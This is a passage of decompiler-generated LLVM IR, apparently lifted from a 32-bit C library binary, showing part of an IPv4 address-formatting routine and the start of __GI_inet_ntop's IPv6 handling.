  %v3_804d620 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d620 = add i32 %v3_804d620, 4
  store i32 %v6_804d620, i32* %edi.global-to-local, align 4
  %v0_804d621 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d621 = inttoptr i32 %v6_804d620 to i32*
  store i32 %v0_804d621, i32* %v2_804d621, align 4
  %v3_804d621 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d621 = add i32 %v3_804d621, 4
  store i32 %v6_804d621, i32* %edi.global-to-local, align 4
  %v0_804d622 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d622 = trunc i32 %v0_804d622 to i16
  %v3_804d622 = inttoptr i32 %v6_804d621 to i16*
  store i16 %v1_804d622, i16* %v3_804d622, align 2
  %v4_804d622 = load i32, i32* %edi.global-to-local, align 4
  %v7_804d622 = add i32 %v4_804d622, 2
  %v0_804d624 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d624 = trunc i32 %v0_804d624 to i8
  %v3_804d624 = inttoptr i32 %v7_804d622 to i8*
  store i8 %v1_804d624, i8* %v3_804d624, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_804d6bf30 = load i32, i32* @esi, align 4
  %v10_804d6bf33 = icmp eq i32 %v0_804d6bf30, 3
  store i1 %v10_804d6bf33, i1* %zf.global-to-local, align 1
  %v7_804d6c235 = icmp sgt i32 %v0_804d6bf30, 3
  br i1 %v7_804d6c235, label %dec_label_pc_804d6c8, label %dec_label_pc_804d62c

dec_label_pc_804d62c:                             ; preds = %dec_label_pc_804d69f, %entry
  %v3_804d642 = phi i32 [ 0, %entry ], [ %v1_804d6c8.pre, %dec_label_pc_804d69f ]
  %v0_804d6bf36 = phi i32 [ %v0_804d6bf30, %entry ], [ %v0_804d6bf, %dec_label_pc_804d69f ]
  %v2_804d632 = add i32 %v0_804d6bf36, %v0_804d601
  %v12_804d632 = icmp eq i32 %v2_804d632, 0
  store i1 %v12_804d632, i1* %zf.global-to-local, align 1
  store i32 %v2_804d632, i32* %ebp.global-to-local, align 4
  %v1_804d634 = inttoptr i32 %v2_804d632 to i8*
  %v2_804d634 = load i8, i8* %v1_804d634, align 1
  %v3_804d634 = zext i8 %v2_804d634 to i32
  %v4_804d634 = load i32, i32* @edx, align 4
  %v5_804d634 = and i32 %v4_804d634, -65536
  %v6_804d634 = or i32 %v5_804d634, %v3_804d634
  store i32 %v6_804d634, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_804d634, 100
  %v6_804d63b = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_804d634, 100
  %v12_804d63b = zext i8 %tmp24 to i32
  %v14_804d63b = mul nuw nsw i32 %v12_804d63b, 256
  %v15_804d63b = or i32 %v6_804d63b, %v5_804d634
  %v16_804d63b = or i32 %v15_804d63b, %v14_804d63b
  store i32 %v16_804d63b, i32* %eax.global-to-local, align 4
  %v2_804d63f = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_804d642 = load i32, i32* @esp, align 4
  %v4_804d642 = add i32 %v2_804d642, 43
  %v5_804d642 = add i32 %v4_804d642, %v3_804d642
  %v6_804d642 = inttoptr i32 %v5_804d642 to i8*
  store i8 %v2_804d63f, i8* %v6_804d642, align 1
  %v0_804d646 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d646 = add i32 %v0_804d646, 1
  store i32 %v0_804d646, i32* @ecx, align 4
  %v0_804d64f = load i32, i32* @esp, align 4
  %v2_804d64f = add i32 %v0_804d646, 43
  %v3_804d64f = add i32 %v2_804d64f, %v0_804d64f
  %v4_804d64f = inttoptr i32 %v3_804d64f to i8*
  %v5_804d64f = load i8, i8* %v4_804d64f, align 1
  %v11_804d64f = icmp eq i8 %v5_804d64f, 48
  store i1 %v11_804d64f, i1* %zf.global-to-local, align 1
  %v1_804d654 = icmp eq i1 %v11_804d64f, false
  %v0_804d67e = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_804d654, label %dec_label_pc_804d67c, label %dec_label_pc_804d656

dec_label_pc_804d656:                             ; preds = %dec_label_pc_804d62c
  %v3_804d65a = trunc i32 %v0_804d67e to i16
  %v5_804d65a = udiv i16 %v3_804d65a, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_804d65a, 256
  %tmp39 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp39 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_804d66c = trunc i16 %tmp39 to i8
  %v2_804d66c = or i8 %v1_804d66c, 48
  %v12_804d66c = zext i8 %v2_804d66c to i32
  store i32 %v12_804d66c, i32* %eax.global-to-local, align 4
  %v7_804d66e = icmp eq i8 %v1_804d66c, 0
  store i1 %v7_804d66e, i1* %zf.global-to-local, align 1
  store i8 %v2_804d66c, i8* %v4_804d64f, align 1
  %v0_804d674 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804d674, label %dec_label_pc_804d69f, label %dec_label_pc_804d676

dec_label_pc_804d676:                             ; preds = %dec_label_pc_804d656
  store i32 %v1_804d646, i32* @ecx, align 4
  br label %dec_label_pc_804d69f

dec_label_pc_804d67c:                             ; preds = %dec_label_pc_804d62c
  store i32 %v1_804d646, i32* %ebx.global-to-local, align 4
  %v3_804d684 = trunc i32 %v0_804d67e to i16
  %v5_804d684 = udiv i16 %v3_804d684, 10
  %tmp40 = urem i16 %v5_804d684, 256
  %tmp41 = urem i16 %tmp40, 10
  %tmp26 = zext i16 %tmp41 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_804d694 = add i32 %v0_804d646, 2
  store i32 %v1_804d694, i32* @ecx, align 4
  %v1_804d699 = trunc i16 %tmp41 to i8
  %v2_804d699 = or i8 %v1_804d699, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804d699 = zext i8 %v2_804d699 to i32
  store i32 %v12_804d699, i32* %eax.global-to-local, align 4
  %v4_804d69b = add i32 %v0_804d646, 44
  %v5_804d69b = add i32 %v4_804d69b, %v0_804d64f
  %v6_804d69b = inttoptr i32 %v5_804d69b to i8*
  store i8 %v2_804d699, i8* %v6_804d69b, align 1
  br label %dec_label_pc_804d69f

dec_label_pc_804d69f:                             ; preds = %dec_label_pc_804d656, %dec_label_pc_804d676, %dec_label_pc_804d67c
  %v0_804d69f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d69f = inttoptr i32 %v0_804d69f to i8*
  %v2_804d69f = load i8, i8* %v1_804d69f, align 1
  %v3_804d69f = zext i8 %v2_804d69f to i32
  store i32 %v3_804d69f, i32* %eax.global-to-local, align 4
  %v0_804d6a8 = load i32, i32* @esi, align 4
  %v1_804d6a8 = add i32 %v0_804d6a8, 1
  store i32 %v1_804d6a8, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804d6ad = load i32, i32* @esp, align 4
  %v1_804d6ad = load i32, i32* @ecx, align 4
  %v2_804d6ad = add i32 %v0_804d6ad, 44
  %v3_804d6ad = add i32 %v2_804d6ad, %v1_804d6ad
  %v4_804d6ad = inttoptr i32 %v3_804d6ad to i8*
  store i8 46, i8* %v4_804d6ad, align 1
  %v0_804d6b2 = load i32, i32* @ecx, align 4
  %v1_804d6b2 = add i32 %v0_804d6b2, 2
  store i32 %v1_804d6b2, i32* %edi.global-to-local, align 4
  %v0_804d6b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d6b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d6b5 = zext i32 %v1_804d6b5 to i64
  %v3_804d6b5 = load i32, i32* %edx.global-to-local, align 4
  %v4_804d6b5 = zext i32 %v3_804d6b5 to i64
  %v5_804d6b5 = mul nuw i64 %v4_804d6b5, 4294967296
  %v6_804d6b5 = or i64 %v5_804d6b5, %v2_804d6b5
  %v7_804d6b5 = zext i32 %v0_804d6b5 to i64
  %v8_804d6b5 = udiv i64 %v6_804d6b5, %v7_804d6b5
  %v9_804d6b5 = trunc i64 %v8_804d6b5 to i32
  %v10_804d6b5 = urem i64 %v6_804d6b5, %v7_804d6b5
  %v11_804d6b5 = trunc i64 %v10_804d6b5 to i32
  store i32 %v11_804d6b5, i32* @edx, align 4
  %v3_804d6b7 = and i32 %v9_804d6b5, -256
  %v1_804d6b9 = trunc i64 %v10_804d6b5 to i8
  %v2_804d6b9 = add i8 %v1_804d6b9, 48
  %v12_804d6b9 = zext i8 %v2_804d6b9 to i32
  %v15_804d6b9 = or i32 %v12_804d6b9, %v3_804d6b7
  store i32 %v15_804d6b9, i32* %eax.global-to-local, align 4
  %v2_804d6bb = load i32, i32* @esp, align 4
  %v4_804d6bb = add i32 %v0_804d6b2, 43
  %v5_804d6bb = add i32 %v4_804d6bb, %v2_804d6bb
  %v6_804d6bb = inttoptr i32 %v5_804d6bb to i8*
  store i8 %v2_804d6b9, i8* %v6_804d6bb, align 1
  %v0_804d6bf = load i32, i32* @esi, align 4
  %v10_804d6bf = icmp eq i32 %v0_804d6bf, 3
  store i1 %v10_804d6bf, i1* %zf.global-to-local, align 1
  %v7_804d6c2 = icmp sgt i32 %v0_804d6bf, 3
  %v1_804d6c8.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_804d6c2, label %dec_label_pc_804d6c8, label %dec_label_pc_804d62c

dec_label_pc_804d6c8:                             ; preds = %dec_label_pc_804d69f, %entry
  %v1_804d6c8 = phi i32 [ 0, %entry ], [ %v1_804d6c8.pre, %dec_label_pc_804d69f ]
  %v0_804d6c8 = load i32, i32* @esp, align 4
  %v2_804d6c8 = add i32 %v0_804d6c8, 42
  %v3_804d6c8 = add i32 %v2_804d6c8, %v1_804d6c8
  %v4_804d6c8 = inttoptr i32 %v3_804d6c8 to i8*
  store i8 0, i8* %v4_804d6c8, align 1
  %v0_804d6cd = load i32, i32* @esp, align 4
  %v9_804d6cd = icmp eq i32 %v0_804d6cd, 12
  store i1 %v9_804d6cd, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_804d6d5 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_804d6d5, i32* @eax, align 4
  %v15_804d6dd = icmp eq i32 %v3_804d6d5, %v0_804d614
  store i1 %v15_804d6dd, i1* %zf.global-to-local, align 1
  %tmp42 = icmp ugt i32 %v3_804d6d5, %v0_804d614
  br i1 %tmp42, label %dec_label_pc_804d6e3, label %dec_label_pc_804d6f2

dec_label_pc_804d6e3:                             ; preds = %dec_label_pc_804d6c8
  %v0_804d6e3 = load i8*, i8** %stack_var_-92, align 4
  %v1_804d6e3 = ptrtoint i8* %v0_804d6e3 to i32
  %v2_804d6e3 = call i32 @__errno_location(i32 %v1_804d6e3)
  %v1_804d6e8 = inttoptr i32 %v2_804d6e3 to i32*
  store i32 28, i32* %v1_804d6e8, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804d701.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d701

dec_label_pc_804d6f2:                             ; preds = %dec_label_pc_804d6c8
  %v2_804d6d0 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_804d6f54 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_804d6f54, i32* %tmp29, align 4
  %v0_804d6f9.cast = inttoptr i32 %v3_804d6f54 to i8*
  %v4_804d6f9 = call i32 @strcpy(i8* %v0_804d6f9.cast, i32 %v2_804d6d0)
  store i32 %v4_804d6f9, i32* %eax.global-to-local, align 4
  %v0_804d6fe = load i32, i32* @esp, align 4
  %v6_804d6fe = icmp eq i32 %v0_804d6fe, -16
  store i1 %v6_804d6fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804d701

dec_label_pc_804d701:                             ; preds = %dec_label_pc_804d6e3, %dec_label_pc_804d6f2
  %v0_804d708 = phi i32 [ 0, %dec_label_pc_804d6e3 ], [ %v4_804d6f9, %dec_label_pc_804d6f2 ]
  %v0_804d701 = phi i32 [ %v0_804d701.pre, %dec_label_pc_804d6e3 ], [ %v15_804d5fe, %dec_label_pc_804d6f2 ]
  %v9_804d701 = icmp eq i32 %v0_804d701, -60
  store i1 %v9_804d701, i1* %zf.global-to-local, align 1
  store i32 %v0_804d5fa, i32* @esi, align 4
  store i32 %v0_804d5f9, i32* @edi, align 4
  ret i32 %v0_804d708

; uselistorder directives
  uselistorder i32 %v0_804d6bf, { 2, 0, 1 }
  uselistorder i8 %v2_804d699, { 1, 0 }
  uselistorder i32 %v0_804d67e, { 1, 0 }
  uselistorder i1 %v11_804d64f, { 1, 0 }
  uselistorder i32 %v1_804d646, { 1, 0 }
  uselistorder i32 %v5_804d634, { 1, 0 }
  uselistorder i32 %v0_804d6bf30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 4, 10, 11, 0, 1, 12, 13, 18, 19, 7, 2, 3, 5, 6, 8, 9, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_804d701, { 1, 0 }
  uselistorder label %dec_label_pc_804d69f, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804d70a = load i32, i32* @edi, align 4
  %v0_804d70b = load i32, i32* @esi, align 4
  %v0_804d70c = load i32, i32* @ebx, align 4
  %v15_804d70d = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_804d714 = icmp eq i32 %arg1, 2
  br i1 %v9_804d714, label %dec_label_pc_804d724, label %dec_label_pc_804d719

dec_label_pc_804d719:                             ; preds = %entry
  %v9_804d719 = icmp eq i32 %arg1, 10
  %v1_804d71c = icmp eq i1 %v9_804d719, false
  br i1 %v1_804d71c, label %dec_label_pc_804d8c3, label %dec_label_pc_804d73c

dec_label_pc_804d724:                             ; preds = %entry
  %v4_804d724 = ptrtoint i8* %arg3 to i32
  store i32 %v4_804d724, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804d730 = call i32 @inet_ntop4(i32 %v0_804d70c, i32 %v0_804d70b, i32 %v0_804d70a)
  store i32 %v3_804d730, i32* %eax.global-to-local, align 4
  store i32 %v3_804d730, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8d0

dec_label_pc_804d73c:                             ; preds = %dec_label_pc_804d719
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_804d741 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804d741, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_804d746 = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_804d746, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804d768 = add i32 %arg2, 1
  br label %dec_label_pc_804d752

dec_label_pc_804d752:                             ; preds = %dec_label_pc_804d752.dec_label_pc_804d752_crit_edge, %dec_label_pc_804d73c
  %v1_804d775 = phi i32 [ %v15_804d70d, %dec_label_pc_804d73c ], [ %v1_804d775.pre, %dec_label_pc_804d752.dec_label_pc_804d752_crit_edge ]
  %v0_804d76d67 = phi i32 [ 0, %dec_label_pc_804d73c ], [ %v0_804d779.pre, %dec_label_pc_804d752.dec_label_pc_804d752_crit_edge ]
  %v1_804d75b = ashr i32 %v0_804d76d67, 31
  %v2_804d75c = zext i32 %v0_804d76d67 to i64
  %v4_804d75c = zext i32 %v1_804d75b to i64
  %v5_804d75c = mul nuw i64 %v4_804d75c, 4294967296
  %v6_804d75c = or i64 %v5_804d75c, %v2_804d75c
  %v8_804d75c = sdiv i64 %v6_804d75c, 2
  %v9_804d75c = trunc i64 %v8_804d75c to i32
  store i32 %v9_804d75c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_804d75c, i32* %ebx.global-to-local, align 4
  %v2_804d764 = add i32 %v0_804d76d67, %arg2
  %v3_804d764 = inttoptr i32 %v2_804d764 to i8*
  %v4_804d764 = load i8, i8* %v3_804d764, align 1
  %v5_804d764 = zext i8 %v4_804d764 to i32
  store i32 %v5_804d764, i32* %eax.global-to-local, align 4
  %v3_804d768 = add i32 %v2_804d768, %v0_804d76d67
  %v4_804d768 = inttoptr i32 %v3_804d768 to i8*
  %v5_804d768 = load i8, i8* %v4_804d768, align 1
  %v6_804d768 = zext i8 %v5_804d768 to i32
  store i32 %v6_804d768, i32* %edx.global-to-local, align 4
  %v1_804d76d = add i32 %v0_804d76d67, 2
  store i32 %v1_804d76d, i32* %ecx.global-to-local, align 4
  %v2_804d770 = mul nuw nsw i32 %v5_804d764, 256
  %v2_804d773 = or i32 %v6_804d768, %v2_804d770
  store i32 %v2_804d773, i32* %eax.global-to-local, align 4
  %v3_804d775 = mul i32 %v9_804d75c, 4
  %v4_804d775 = add i32 %v3_804d775, 60
  %v5_804d775 = add i32 %v4_804d775, %v1_804d775
  %v6_804d775 = inttoptr i32 %v5_804d775 to i32*
  store i32 %v2_804d773, i32* %v6_804d775, align 4
  %v0_804d779.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_804d77c = icmp sgt i32 %v0_804d779.pre, 15
  br i1 %v7_804d77c, label %dec_label_pc_804d77e, label %dec_label_pc_804d752.dec_label_pc_804d752_crit_edge

dec_label_pc_804d752.dec_label_pc_804d752_crit_edge: ; preds = %dec_label_pc_804d752
  %v1_804d775.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d752

dec_label_pc_804d77e:                             ; preds = %dec_label_pc_804d752
  %v4_804d73c = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d788.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d788

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d77e, %dec_label_pc_804d7b5
  %v0_804d7b566 = phi i32 [ 0, %dec_label_pc_804d77e ], [ %v1_804d7b5, %dec_label_pc_804d7b5 ]
  %v0_804d7a065 = phi i32 [ -1, %dec_label_pc_804d77e ], [ %v0_804d7a09, %dec_label_pc_804d7b5 ]
  %v0_804d7c064 = phi i32 [ -1, %dec_label_pc_804d77e ], [ %v0_804d7a510, %dec_label_pc_804d7b5 ]
  %v0_804d7cb63 = phi i32 [ -1, %dec_label_pc_804d77e ], [ %v0_804d7b014, %dec_label_pc_804d7b5 ]
  %v2_804d788 = mul nuw nsw i32 %v0_804d7b566, 4
  %v3_804d788 = add nuw nsw i32 %v2_804d788, 60
  %v4_804d788 = add i32 %v3_804d788, %v0_804d788.pre
  %v5_804d788 = inttoptr i32 %v4_804d788 to i32*
  %v6_804d788 = load i32, i32* %v5_804d788, align 4
  %v7_804d788 = icmp eq i32 %v6_804d788, 0
  %v1_804d78d = icmp eq i1 %v7_804d788, false
  %v10_804d7a0 = icmp eq i32 %v0_804d7a065, -1
  br i1 %v1_804d78d, label %dec_label_pc_804d7a0, label %dec_label_pc_804d78f

dec_label_pc_804d78f:                             ; preds = %dec_label_pc_804d788
  %v1_804d792 = icmp eq i1 %v10_804d7a0, false
  br i1 %v1_804d792, label %dec_label_pc_804d79d, label %dec_label_pc_804d794

dec_label_pc_804d794:                             ; preds = %dec_label_pc_804d78f
  store i32 %v0_804d7b566, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7b5

dec_label_pc_804d79d:                             ; preds = %dec_label_pc_804d78f
  %v0_804d79d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d79d = add i32 %v0_804d79d, 1
  store i32 %v1_804d79d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d7b5

dec_label_pc_804d7a0:                             ; preds = %dec_label_pc_804d788
  br i1 %v10_804d7a0, label %dec_label_pc_804d7b5, label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804d7a0
  %v10_804d7a5 = icmp eq i32 %v0_804d7c064, -1
  %v0_804d7ae.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d7aa = load i32, i32* @ebp, align 4
  %v7_804d7ac = icmp sgt i32 %v0_804d7ae.pre, %v1_804d7aa
  %or.cond = or i1 %v10_804d7a5, %v7_804d7ac
  br i1 %or.cond, label %dec_label_pc_804d7ae, label %dec_label_pc_804d7b2

dec_label_pc_804d7ae:                             ; preds = %dec_label_pc_804d7a5
  store i32 %v0_804d7ae.pre, i32* @ebp, align 4
  store i32 %v0_804d7cb63, i32* @edi, align 4
  br label %dec_label_pc_804d7b2

dec_label_pc_804d7b2:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d7ae
  %v0_804d7a512 = phi i32 [ %v0_804d7cb63, %dec_label_pc_804d7ae ], [ %v0_804d7c064, %dec_label_pc_804d7a5 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7b5

dec_label_pc_804d7b5:                             ; preds = %dec_label_pc_804d7a0, %dec_label_pc_804d79d, %dec_label_pc_804d794, %dec_label_pc_804d7b2
  %v0_804d7b014 = phi i32 [ %v0_804d7cb63, %dec_label_pc_804d7a0 ], [ %v0_804d7cb63, %dec_label_pc_804d79d ], [ %v0_804d7b566, %dec_label_pc_804d794 ], [ -1, %dec_label_pc_804d7b2 ]
  %v0_804d7a09 = phi i32 [ -1, %dec_label_pc_804d7a0 ], [ %v0_804d7a065, %dec_label_pc_804d79d ], [ %v0_804d7b566, %dec_label_pc_804d794 ], [ -1, %dec_label_pc_804d7b2 ]
  %v0_804d7a510 = phi i32 [ %v0_804d7c064, %dec_label_pc_804d7a0 ], [ %v0_804d7c064, %dec_label_pc_804d79d ], [ %v0_804d7c064, %dec_label_pc_804d794 ], [ %v0_804d7a512, %dec_label_pc_804d7b2 ]
  %v1_804d7b5 = add nuw nsw i32 %v0_804d7b566, 1
  store i32 %v1_804d7b5, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804d7b5, 8
  br i1 %exitcond, label %dec_label_pc_804d7bb, label %dec_label_pc_804d788

dec_label_pc_804d7bb:                             ; preds = %dec_label_pc_804d7b5
  %v10_804d7bb = icmp eq i32 %v0_804d7b014, -1
  br i1 %v10_804d7bb, label %dec_label_pc_804d7cd, label %dec_label_pc_804d7c0

dec_label_pc_804d7c0:                             ; preds = %dec_label_pc_804d7bb
  %v10_804d7c0 = icmp eq i32 %v0_804d7a510, -1
  %v0_804d7c9.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_804d7c0, label %dec_label_pc_804d7c9, label %dec_label_pc_804d7c5

dec_label_pc_804d7c5:                             ; preds = %dec_label_pc_804d7c0
  %v1_804d7c5 = load i32, i32* @ebp, align 4
  %v7_804d7c7 = icmp sgt i32 %v0_804d7c9.pre, %v1_804d7c5
  br i1 %v7_804d7c7, label %dec_label_pc_804d7c9, label %dec_label_pc_804d7cd

dec_label_pc_804d7c9:                             ; preds = %dec_label_pc_804d7c0, %dec_label_pc_804d7c5
  store i32 %v0_804d7c9.pre, i32* @ebp, align 4
  store i32 %v0_804d7b014, i32* @edi, align 4
  br label %dec_label_pc_804d7cd

dec_label_pc_804d7cd:                             ; preds = %dec_label_pc_804d7c5, %dec_label_pc_804d7bb, %dec_label_pc_804d7c9
  %v5_804d7da = phi i32 [ %v0_804d7a510, %dec_label_pc_804d7c5 ], [ %v0_804d7a510, %dec_label_pc_804d7bb ], [ %v0_804d7b014, %dec_label_pc_804d7c9 ]
  %v10_804d7cd = icmp eq i32 %v5_804d7da, -1
  br i1 %v10_804d7cd, label %dec_label_pc_804d7dd, label %dec_label_pc_804d7d2

dec_label_pc_804d7d2:                             ; preds = %dec_label_pc_804d7cd
  %v0_804d7d2 = load i32, i32* @ebp, align 4
  %v1_804d7d2 = add i32 %v0_804d7d2, -1
  %v6_804d7d2 = sub i32 0, %v0_804d7d2
  %v7_804d7d2 = and i32 %v0_804d7d2, %v6_804d7d2
  %v8_804d7d2 = icmp slt i32 %v7_804d7d2, 0
  %v9_804d7d2 = icmp eq i32 %v1_804d7d2, 0
  %v10_804d7d2 = icmp slt i32 %v1_804d7d2, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_804d7da = icmp ne i1 %v10_804d7d2, %v8_804d7d2
  %v4_804d7da = or i1 %v9_804d7d2, %v3_804d7da
  %v7_804d7da = select i1 %v4_804d7da, i32 -1, i32 %v5_804d7da
  store i32 %v7_804d7da, i32* @edi, align 4
  br label %dec_label_pc_804d7dd

dec_label_pc_804d7dd:                             ; preds = %dec_label_pc_804d7cd, %dec_label_pc_804d7d2
  %v0_804d87d19 = phi i32 [ %v5_804d7da, %dec_label_pc_804d7cd ], [ %v7_804d7da, %dec_label_pc_804d7d2 ]
  %v2_804d7dd = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804d7dd, i32* @ebx, align 4
  %v3_804d85f = add i32 %v4_804d73c, 64
  %v12_804d81d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_804d87d55 = icmp eq i32 %v0_804d87d19, -1
  %v1_804d825 = icmp eq i1 %v12_804d81d, false
  br label %dec_label_pc_804d7e8

dec_label_pc_804d7e8:                             ; preds = %dec_label_pc_804d7dd, %dec_label_pc_804d873
  %v10_804d87d62 = phi i1 [ %v10_804d87d55, %dec_label_pc_804d7dd ], [ %v10_804d87d, %dec_label_pc_804d873 ]
  %v0_804d80261 = phi i32 [ 0, %dec_label_pc_804d7dd ], [ %v1_804d873, %dec_label_pc_804d873 ]
  %v1_804d7f860 = phi i32 [ %v0_804d87d19, %dec_label_pc_804d7dd ], [ %v0_804d87d.pre, %dec_label_pc_804d873 ]
  %v0_804d80659 = phi i32 [ %v2_804d7dd, %dec_label_pc_804d7dd ], [ %v0_804d7fc20, %dec_label_pc_804d873 ]
  %stack_var_-120.158 = phi i8* [ null, %dec_label_pc_804d7dd ], [ %stack_var_-120.0, %dec_label_pc_804d873 ]
  %stack_var_-116.157 = phi i32 [ 32, %dec_label_pc_804d7dd ], [ %stack_var_-116.0, %dec_label_pc_804d873 ]
  br i1 %v10_804d87d62, label %dec_label_pc_804d802, label %dec_label_pc_804d7ed

dec_label_pc_804d7ed:                             ; preds = %dec_label_pc_804d7e8
  %v2_804d7ed = sub i32 %v0_804d80261, %v1_804d7f860
  %v8_804d7ed = xor i32 %v0_804d80261, %v1_804d7f860
  %v9_804d7ed = xor i32 %v2_804d7ed, %v0_804d80261
  %v10_804d7ed = and i32 %v9_804d7ed, %v8_804d7ed
  %v11_804d7ed = icmp slt i32 %v10_804d7ed, 0
  %v12_804d7ed = icmp eq i32 %v2_804d7ed, 0
  %v13_804d7ed = icmp slt i32 %v2_804d7ed, 0
  %v2_804d7ef = icmp eq i1 %v13_804d7ed, %v11_804d7ed
  br i1 %v2_804d7ef, label %dec_label_pc_804d7f1, label %dec_label_pc_804d802

dec_label_pc_804d7f1:                             ; preds = %dec_label_pc_804d7ed
  %v1_804d7f1 = load i32, i32* @ebp, align 4
  %v2_804d7f1 = add i32 %v1_804d7f1, %v1_804d7f860
  store i32 %v2_804d7f1, i32* %eax.global-to-local, align 4
  %v2_804d7f4 = sub i32 %v0_804d80261, %v2_804d7f1
  %v8_804d7f4 = xor i32 %v2_804d7f1, %v0_804d80261
  %v9_804d7f4 = xor i32 %v2_804d7f4, %v0_804d80261
  %v10_804d7f4 = and i32 %v9_804d7f4, %v8_804d7f4
  %v11_804d7f4 = icmp slt i32 %v10_804d7f4, 0
  %v13_804d7f4 = icmp slt i32 %v2_804d7f4, 0
  %v2_804d7f6 = icmp eq i1 %v13_804d7f4, %v11_804d7f4
  br i1 %v2_804d7f6, label %dec_label_pc_804d802, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7f1
  %v1_804d7fa = icmp eq i1 %v12_804d7ed, false
  br i1 %v1_804d7fa, label %dec_label_pc_804d873, label %dec_label_pc_804d7fc

dec_label_pc_804d7fc:                             ; preds = %dec_label_pc_804d7f8
  %v1_804d7fc = inttoptr i32 %v0_804d80659 to i8*
  store i8 58, i8* %v1_804d7fc, align 1
  %v0_804d7ff = load i32, i32* @ebx, align 4
  %v1_804d7ff = add i32 %v0_804d7ff, 1
  store i32 %v1_804d7ff, i32* @ebx, align 4
  br label %dec_label_pc_804d873

